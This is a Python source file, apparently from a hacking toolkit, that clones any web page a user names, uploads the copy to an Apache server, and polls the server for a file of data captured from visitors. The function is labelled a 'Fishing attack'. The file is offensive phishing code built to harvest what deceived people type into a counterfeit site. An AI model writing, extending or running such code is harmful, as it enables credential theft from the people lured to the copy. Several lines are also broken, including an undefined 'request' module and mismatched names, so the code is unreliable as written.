import Includes.includes as include
from Setup.setup import commands
import requests
import urllib.request
import time
import os

def clone():
    '''
    Clone the page qsked by the user
    :return: filename of the stored html cloned file: str
    '''
    slash = include.command(commands, 'slash')
    dir = "data%sCloned" % slash

    url = str(input("URL to clone: "))

    site, name = include.construct_url(url)

    if os.path.isdir(dir) == False:
        os.system("mkdir data%sCloned" % slash)
    # Check if the the page has been already cloned
    if os.path.isfile("%s%s%s.html" % (dir,slash,name)):
        print('[+] %s page already cloned' % name)
        print('[+] The html %s file is stored in %s' % (name,dir))
        time.sleep(10)
        return dir+slash+name+".html"

    page = requests.get(site)
    fileName = '%s%sTemp.html' % (dir, slash)
    os.system('%s %s' % (include.command(commands, 'create'), fileName))

    f = open(fileName, 'wb')
    f.write(page.text.encode('utf-8'))
    f.close()

    include.HTMLParser(fileName,"%s%s%s.html" % (dir,slash, name))

    os.system("%s %s" % (include.command(commands,'remove'), fileName))

    print('[*] Cloning site %s ....' % site)
    time.sleep(1)
    print('[+] Site %s cloned' % site)
    print('[+] Cloning completed, the html file is stored in %s%s%s.html' % (dir, slash, name))
    time.sleep(5)

    return dir+slash+name+".html"

def fish():
    '''
    Fishing attack
    :return: void
    '''

    ### Deal with the output file
    slash = include.command(commands, 'slash')
    outputFile = str(input("output file: "))
    dir = "data%sFishing" % slash
    fileName = dir+slash+outputFile
    # Checks on the existence and craeation if necessary
    if os.path.isdir(dir) == False:
        os.system('mkdir %s' % dir)
    fileName = include.ifexists(fileName)

    # Clone the page and do the necessary edits
    page = clone()

    # Host server
    host = str(input('Host server (localhost for the IP of our machine): '))

    localAdress = include.get_ip()[1]

    files = {'file': open(page)}
    if host == 'localhost' or host == localAdress:
        version = ""

        f = open('Setup%sserver.config' % slash, 'r')
        for line in f:
            if '#' not in line:
                if 'MAMP' in line:
                    version = 'MAMP'
                elif 'XAMPP' in line:
                    version = 'XAMPP'
                elif 'Linux' in line:
                    version = 'linux'
        if version == 'linux':
            try:
                os.system('sudo service apache2 start')
            except:
                print("[-] Cannot start the apache server.")
                print("[-] Exiting the attack")
                return

        try:
            r = requests.post(host+":8888/index.php", files=files)
        except Exception as e:
            print(e)
            print('[-] Unable to send the cloned page to the server')
            print('[-] Exiting the attack')
            time.sleep(5)
            return

    else:
        try:
            r = requests.post("http://"+host+"/index.php", files=files)
        except Exception as e:
            print(e)
            print('[-] Unable to send the cloned page to the server')
            print('[-] Exiting the attack')
            time.sleep(5)

    print("[+] File sent to the server")
    target_URL = host+slash+"temp.txt"
    while 1:
        try:
            print("[*] Listening on http//%s ...." % host)
            data = request.get(target_URL)
            if data.status_code == 200:
                f = open(fileName, 'w')
                for line in data.contents:
                    f.write(line.decode("utf-8"))
                f.close()
            break
        except:
            time.sleep(5)
    if not data.content:
        print("[-] Unable to recieve the data")
        print("[-] Exiting the attack")
        return
    print("[+] Data reveived")
    
    print('[+] Fishing completed, the file is stored as:  %s' % fileName)
    if version == 'Linux':
        os.system('sudo service apache2 stop')
